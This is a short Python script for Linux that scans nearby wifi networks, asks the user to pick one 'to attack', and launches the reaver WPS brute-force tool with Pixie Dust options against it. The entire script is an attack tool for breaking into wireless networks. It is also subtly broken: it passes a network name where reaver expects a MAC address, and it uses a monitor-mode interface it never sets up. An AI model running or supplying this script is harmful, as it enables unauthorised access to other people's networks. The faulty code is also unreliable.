# This code will only work on Linux
import subprocess
import re

# Run the command to show the wifi list and capture the output
output = subprocess.run(["iwlist", "wlan0", "scan"], capture_output=True, text=True)

# Parse the output to extract the SSID of each wifi network
wifi_list = []
for match in re.finditer(r"ESSID:\"(.+)\"", output.stdout):
    ssid = match.group(1).strip()
    wifi_list.append(ssid)

# Print the list of wifi networks with their SSID
print("Available wifi networks:")
for i, ssid in enumerate(wifi_list):
    print(f"{i+1}. SSID: {ssid}")

# Prompt the user to select a wifi network by entering the SSID
selection = input("Enter the SSID of the wifi network to attack: ")
if selection not in wifi_list:
    print("Invalid selection")
    exit()

# Run the reaver attack command
print("Running reaver attack...")
subprocess.run(["reaver", "-i", "wlan0mon", "-b", selection, "-vv", "-K", "1", "-N", "-S", "-c", "1"])